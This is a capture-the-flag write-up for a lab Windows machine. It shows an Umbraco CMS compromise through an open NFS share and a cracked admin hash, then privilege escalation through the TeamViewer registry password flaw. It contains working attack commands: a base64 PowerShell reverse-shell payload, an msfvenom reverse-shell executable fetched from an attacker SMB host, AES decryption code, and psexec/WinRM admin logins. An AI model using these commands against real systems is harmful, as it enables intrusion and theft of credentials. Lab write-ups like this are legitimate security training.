Box: Windows
Level: Easy
### Index
1. Initial Nmap Enumeration
2. Port 21 - FTP Enumeration
3. Port 80 - Web Enumeration
4. Port 2049 - mountd Enumeration
5.  [Umbraco CMS 7.12.4 - Remote Code Execution](https://www.exploit-db.com/exploits/49488)
	5.1  RCE successful
	5.2  Struggling to get a reverse shell
6.   Privilege Escalation
7.   Lesson Learned
8.   Other Than Evil-WinRm

### Initial Nmap Enumeration

```
$ nmap -p- --min-rate=1000 -Pn -T4 -sC -sV 10.10.10.180
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-19T05:25:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 59m58s
```

### Port 21 - FTP Enumeration

Running FTP Scan we found that the anonymous login was allowed but somehow I couldn't get anything from the FTP.
```
$ nmap -p21 --script=ftp* -sC -sV -Pn 10.10.10.180  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 00:52 EDT
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 40360 guesses in 600 seconds, average tps: 65.9
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Writing something through FTP was denied.
```
┌──(ringbuffer㉿kali)-[~/Downloads/Remote.htb]
└─$ echo "a" > a.txt                                           
┌──(ringbuffer㉿kali)-[~/Downloads/Remote.htb]
└─$ ftp anonymous@10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put a.txt
local: a.txt remote: a.txt
229 Entering Extended Passive Mode (|||49699|)
550 Access is denied. 
ftp> 
```

Nothing to list or retrieve from FTP.
### Port 80 - Web Enumeration

When sending the very first HTTP request to http://remote.htb/ we notice the following CSS was mentioned in the HTTP response.
```
<link rel="stylesheet" href="/css/umbraco-starterkit-style.css" />
```

Digging up on the Internet, I found that [Umbraco](https://umbraco.com/) is an open source ASP.NET Core CMS. So we know we are going to deal with Umbraco. One of the HTTP response reveals the server version. It was `Server: Microsoft-IIS/10.0`.  When I turn on this box, I found the following details which makes me believe that I should first focus on either `Port 135/445`. But I got `ACCESS_DENIED` error when I try to enumerate shares. Here's the machine description I notice on the page.

```
Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using `psexec` with these credentials returns a SYSTEM shell.
```

So the machine information clearly state that the credentials are found in world-readable NFS Share. I try to enumerate some other ports but then I found `port/2049` which has `mountd` service running. To be honest, I read the first question on the HTB Guided mode where it says `What is the service running on port 2049?`
### Port 2049 - mountd Enumeration

```
$ nmap -p2049 -sV -sC 10.10.10.180
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 12:44 EDT
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.049s latency).

PORT     STATE SERVICE VERSION
2049/tcp open  mountd  1-3 (RPC #100005)
```

Following to that, I ran `nfs*` Nmap script to enumerate Shares
```
$ nmap -p2049 --script=nfs* -sV -sC 10.10.10.180
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 21:50 EDT
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.039s latency).

PORT     STATE SERVICE VERSION
2049/tcp open  mountd  1-3 (RPC #100005)
| nfs-showmount: 
|_  /site_backups 
```

The `nsf-showmount` returns `/site-backups` is allowed to mount. Let's mount the `/site-backup` on to our local directory.
```
$ sudo mkdir /mnt/backup_remote

┌──(ringbuffer㉿kali)-[~/Downloads/Remote.htb]
└─$ sudo mount 10.10.10.180:/site_backups /mnt/backup_remote/

┌──(ringbuffer㉿kali)-[~/Downloads/Remote.htb]
└─$ ls /mnt/backup_remote
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```

So we have our share mounted. Let's dig into it.

Upon digging `Web.Config` file, we found the following Umbraco version.
`<add key="umbracoConfigurationStatus" value="7.12.4" />`

Upon digging deeper, and after clicking on `Hint` on HTB, I learned that the `Web.Config` contains the Connection Strings and I did not know what it means. So let me walkthrough it.

First Look at the following lines on `Web.Config`
```
<connectionStrings>
	<remove name="umbracoDbDSN" />
	<add name="umbracoDbDSN" connectionString="Data Source=|DataDirectory|\Umbraco.sdf;Flush Interval=1;" providerName="System.Data.SqlServerCe.4.0" />
	<!-- Important: If you're upgrading Umbraco, do not clear the connection string / provider name during your web.config merge. -->
</connectionStrings>
```

Okay I have learned in the past that the `connectionStrings` are used in the `Web.Config` file for making a connection with the database so that application can perform tasks such as Insert/Update/Delete from the DB. Fine. Now pay close attention to the line where it says `connectionString=` and `providerName=`. The `connectionString=` refers to the `DataDirectory` which is an `App_Data` folder and Umbraco.sdf file. But looking at the provider we know that it's SQL Server CE (Compact). I tried to install `dbeaver` on Kali Linux to open the SDF file however, it did not helped me. I ended up installing the vscode on Kali Linux to open the SDF file. But here is how I did it.

First You will need to open VSCode on Kali using the following Command
```
sudo code --no-sandbox --user-data-dir Umbraco
### WHERE the Umbraco is just an empty user directory. The reason you will need to do this way is because your /mnt directory is only accessible for super users. Now you can open the whole /site_backups mounted share from the /mnt directory.
```

Next, Look at the `Web.Config` file as I have mentioned above. Now simply open the `Umbraco.sdf` file from the `APP_DATA` directory. 
![](Pasted%20image%2020240820002947.png)

I know the format looks weird but don't worry. I'll tell you what i notice here. Look at the `Line 4`. Here's the breakdown. 
`Administrator admin b8be16a.......` That's our hash. Copy the hash up until `2aaa` and than Look at the `hashAlgorithm` in the bracket. `SHA1`.  We are going to crack this hash using `hashcat` But also notice the `Line 7`. The SPN `Service Principal Name` is `@htb.local`.

Let's crack this hash using our hashcat
```
$ hashcat -m 100 -a 0 b8be16afba8c314ad33d812f22a04991b90e2aaa /usr/share/wordlists/rockyou.txt 
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese   

if you re-run this command just add --show at the end.
```

Okay so we have our password for the Administrator user. Let's finally Login to Umbraco.

![](Pasted%20image%2020240820003433.png)

Time to get shell I guess. I found the [Umbraco RCE](https://www.exploit-db.com/exploits/49488) on Exploit-DB. Let's try it out.

### Umbraco CMS 7.12.4 - Remote Code Execution

Okay so before i dive into this, I wanted to make sure that I admit one thing. At this point, I will have to learn about [Nishang Framework](https://github.com/samratashok/nishang). Upon obtaining the exploit I was able to run the single/one command only. Something like `whoami` or `dir`. Nothing else. I obtained the successful RCE but getting reverse shell was something I struggled. 
Here is my initial Exploit Runs
```
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
iis apppool\defaultapppool
```

Notice that I can run the command. Yeah, you'll think why don't you replace `whoami` with a netcat or powershell.exe or something like that. Yeah. I will do it now. Let me put the straight record that powershell with base64 encoded payload did not work for me on this machine. Upon asking help on the Discord, I received the feedback that `Bro..Use the Nishang-Framework`. Here's the failed attempt to obtained the Reverse shell using Powershell base64 encoded payload. 

I use https://www.revshells.com/ to get the base64 encoded payload. Yeah I know I can do it with CLI but I'm a GUI guy all right. I am dumb enough to figure out how to use `base64` command on kali. 

![](Pasted%20image%2020240820204744.png)

Look at that. Select Shell as `PowerShell` and Encoding as `Base64`. Now here is my command to get the reverse shell. NetCat listener was running on port 4444.

```
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-e JExIT1NUID0gIjEwLjEwLjE2LjUiOyAkTFBPUlQgPSA0NDQ0OyAkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOyAkTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7ICRTdHJlYW1SZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIuQXV0b0ZsdXNoID0gJHRydWU7ICRCdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsgd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7IHdoaWxlICgkTmV0d29ya1N0cmVhbS5EYXRhQXZhaWxhYmxlKSB7ICRSYXdEYXRhID0gJE5ldHdvcmtTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCk7ICRDb2RlID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRSYXdEYXRhIC0xKSB9OyBpZiAoJFRDUENsaWVudC5Db25uZWN0ZWQgLWFuZCAkQ29kZS5MZW5ndGggLWd0IDEpIHsgJE91dHB1dCA9IHRyeSB7IEludm9rZS1FeHByZXNzaW9uICgkQ29kZSkgMj4mMSB9IGNhdGNoIHsgJF8gfTsgJFN0cmVhbVdyaXRlci5Xcml0ZSgiJE91dHB1dGBuIik7ICRDb2RlID0gJG51bGwgfSB9OyAkVENQQ2xpZW50LkNsb3NlKCk7ICROZXR3b3JrU3RyZWFtLkNsb3NlKCk7ICRTdHJlYW1SZWFkZXIuQ2xvc2UoKTsgJFN0cmVhbVdyaXRlci5DbG9zZSgp'
??????????????????????????????4????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????4??????????????????????????????????????????? : The term '????????????????????????
??????4????????????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????4???????????????????????????????????????????' is not recognized as the name of a cmdlet, function, 
script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is 
correct and try again.
At line:1 char:1
+ ??????????????????????????????4?????????????????????????????????????? ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (???????????????...???????????????:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

So I used a different way. I generate the EXE payload using `msfvenom` and get it on the target. **REMEMBER: C:\Windows\Temp\ Directory are Usually Writable**.

Generating the payload
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: revshell.exe
```

Now Starting the SMB server
```
$ impacket-smbserver a /home/ringbuffer/Downloads/Remote.htb -smb2support                 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now Running the PoC command twice to get my revshell.exe on the target.

```
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'net use \\10.10.14.4\a'

$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'copy //10.10.14.4/a/revshell.exe C:/Windows/Temp/revshell.exe'
```

Once you run the second command, you will notice the SMB activity on your SMB Server 
```
[*] Incoming connection (10.10.10.180,49694)
[*] AUTHENTICATE_MESSAGE (\,REMOTE)
[*] User REMOTE\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:a)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:a)
[*] Closing down connection (10.10.10.180,49694)
[*] Remaining connections []
```

Now Running the PoC Code one last time but before doing that start the NetCat Listener to catch the shell

```
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'C:/Windows/Temp/revshell.exe'
```

You got your shell where the listener was running. Get your User Flag from the C:\Users\Public\Desktop Folder.

### Privilege Escalation

So I ran the winPEAS.bat and got some of the good results but before I dive into it, one of the flag I will need to capture is the list of running services in windows.
Here's the command I used to get the list of running services in Windows 
```
net start
tasklist /svc
```

So We notice two things as a low privilege user.  When grabbing the `user.txt` from the Public Desktop, We notice that there was a `TeamViewer 7.lnk` was also present. 
```
C:\Users\Public\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D582-9880

 Directory of C:\Users\Public\Desktop

01/09/2024  10:48 AM    <DIR>          .
01/09/2024  10:48 AM    <DIR>          ..
02/20/2020  03:14 AM             1,191 TeamViewer 7.lnk
08/20/2024  02:29 AM                34 user.txt
               2 File(s)          1,225 bytes
               2 Dir(s)  12,998,299,648 bytes free
```

The unusual server TeamView was also running. Upon Digging on the Internet, I notice that [CVE-2019-18988](https://whynotsecurity.com/blog/teamviewer/)  **TeamViewer stored user passwords encrypted with AES-128-CBC with they key of 0602000000a400005253413100040000 and iv of 0100010067244F436E6762F25EA8D704 in the Windows registry. If the password is reused anywhere, privilege escalation is possible. ** 

The link above covers the detail with PoC code that I used to decrypt the AES Encryption. With the Low Privilege shell, I ran the following command to obtain the AES Encrypted password from the Registry key.

```
C:\Users\Public\Desktop>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056B02E3F
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x659d58d6
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\AccessControl
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\DefaultSettings

```

Pay attention to the `SecurityPasswordAES` in the above output. That is our AES Encrypted password. Now According to the [PoC Article](https://whynotsecurity.com/blog/teamviewer/). You can use the following Python Code to decrypt your AES Encrypted password.

```
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"			# output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

Run the python code and get the password.
```
$ python Cracking_AES.py  
00000000: 21 00 52 00 33 00 6D 00  30 00 74 00 65 00 21 00  !.R.3.m.0.t.e.!.
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
None
!R3m0te!
```

Bingo!! You got your Administrator Password. Get Evil-WinRM Shell and get Root Flag.

```
──(ringbuffer㉿kali)-[~/Downloads/Remote.htb]
└─$ evil-winrm -i 10.10.10.180 -u Administrator -p '!R3m0te!'                                          
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
c1d43156566bbba225579a8bc226ba9e
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

### Lesson Learned

1.  During the Privilege Escalation, I was trying to spawn a new cmd.exe or powershell.exe from the low privilege shell and used some of the following command which didn't work. 
	1.1   `runas /user:Administrator` = This command should give a prompt to enter the Admin Password. However, the box was skipping that part and loading the same privilege shell.

```
$username = "Administrator"
$password = ConvertTo-SecureString "!R3m0te!" -AsPlainText -Force
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
Start-Process "cmd.exe" -Credential $cred
```

2.  The above set of commands were also tried out on the Low Privilege PowerShell but the shell was not loading anything and I had to re-spawn the original low privilege shell.
3. Other than `Evil-WinRm`, the thing that worked and I should remember is the following command

### Other Than Evil-WinRm

It is possible that the `Evil-WinRM` will not always work and you will have your password but not the way to get the high privilege admin shell. You can use `Impacket-Psexec` to get the shell as well.

```
$ impacket-psexec 'Administrator:!R3m0te!@10.10.10.180' 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file gZTCDlfJ.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service xWJX on 10.10.10.180.....
[*] Starting service xWJX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

Another way to get into the shell is `impacket-wmiexec`.
```
$ impacket-wmiexec 'Administrator:!R3m0te!@10.10.10.180'                      
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
remote\administrator
```

These are some of the direct shell. But in some cases, you will need to use `smbclient` to get your flag and you might not have a shell at all. Here's how you should do it. 

```
$ smbclient -U Administrator \\\\10.10.10.180\\C$
Password for [WORKGROUP\Administrator]:!R3m0te!    # Provide the Admin Password Here
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Wed Feb 19 15:04:06 2020
  Config.Msi                        DHS        0  Fri Jul  9 07:41:56 2021
  Documents and Settings          DHSrn        0  Wed Feb 19 15:03:20 2020
  ftp_transfer                        D        0  Thu Feb 20 01:13:36 2020
  inetpub                             D        0  Wed Feb 19 15:11:33 2020
  Microsoft                           D        0  Wed Feb 19 23:09:44 2020
  pagefile.sys                      AHS 402653184  Tue Aug 20 02:29:10 2024
  PerfLogs                            D        0  Sat Sep 15 03:19:00 2018
  Program Files                      DR        0  Fri Jul  9 07:41:04 2021
  Program Files (x86)                 D        0  Sun Feb 23 14:19:45 2020
  ProgramData                        DH        0  Wed Feb 19 16:16:04 2020
  Recovery                         DHSn        0  Wed Feb 19 15:03:20 2020
  site_backups                        D        0  Tue Aug 20 02:29:13 2024
  System Volume Information         DHS        0  Thu Feb 20 01:43:40 2020
  tmp                                 D        0  Tue Aug 20 21:05:43 2024
  Users                              DR        0  Wed Feb 19 15:12:25 2020
  Windows                             D        0  Wed Aug 21 00:13:01 2024

                6206975 blocks of size 4096. 3173387 blocks available
smb: \> cd Users
smb: \Users\> cd Administrator
smb: \Users\Administrator\> cd Desktop
smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> 
```

